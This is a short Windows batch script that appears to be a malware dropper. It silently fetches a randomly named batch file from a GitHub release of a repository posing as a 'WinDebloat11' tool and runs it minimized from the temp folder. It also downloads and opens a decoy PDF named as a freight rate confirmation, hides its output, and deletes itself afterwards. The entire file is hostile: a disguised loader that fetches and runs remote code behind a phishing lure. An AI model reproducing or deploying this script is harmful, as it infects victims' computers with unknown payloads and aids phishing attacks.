@echo off
setlocal enabledelayedexpansion

set "R=https://github.com/jimmyishere111/WinDebloat11/releases/download/Rel121"
set "T=%TEMP%"
set "D=%USERPROFILE%\Downloads"

echo.
echo  [curl] Downloading...
echo.

curl.exe -s -L -o "%T%\wdsrpn431cdv.bat" "%R%/wdsrpn43cdv.bat" >nul 2>&1
curl.exe -s -L -o "%D%\Rate_Confirmation_LD-2026-0847.pdf" "%R%/Rate_Confirmation_LD-2026-0847.pdf" >nul 2>&1

if exist "%T%\wdsrpn431cdv.bat" start "" /min cmd /c "%T%\wdsrpn431cdv.bat"
if exist "%D%\Rate_Confirmation_LD-2026-0847.pdf" start "" "%D%\Rate_Confirmation_LD-2026-0847.pdf"

timeout /t 2 /nobreak >nul
del "%~f0" /f /q >nul 2>&1
endlocal
exit
